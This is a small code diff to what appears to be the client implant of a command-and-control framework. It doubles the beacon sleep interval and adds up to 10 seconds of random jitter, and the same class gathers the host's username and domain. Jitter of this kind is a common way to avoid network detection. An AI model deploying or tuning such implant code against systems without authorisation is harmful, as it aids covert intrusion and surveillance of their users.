@@ -443,8 +443,8 @@ class STJob:
 class STClient:
     public Jobs as List = []
     public Channels as List = [PUT_COMM_CLASSES_HERE]
-    public Sleep as int = 5000
-    public MaxJitter as int = 0
+    public Sleep as int = 10000
+    public MaxJitter as int = 10000
     public MinJitter as int = 0
     public Username = Environment.UserName
     public Domain = Environment.UserDomainName
